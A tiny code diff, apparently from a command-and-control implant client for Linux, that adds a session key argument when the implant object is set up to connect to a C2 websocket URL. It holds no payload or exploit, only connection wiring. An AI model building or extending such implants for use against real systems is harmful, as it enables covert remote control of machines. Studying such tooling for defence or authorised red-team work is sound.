@@ -633,7 +633,7 @@ if __name__ == "__main__":
 
     C2_WS_URL = f"{url}:{port}"
     
-    impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=group)
+    impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=group,sess_key=sess_key)
     
     def signal_handler(sig, frame):
         impl.running = False
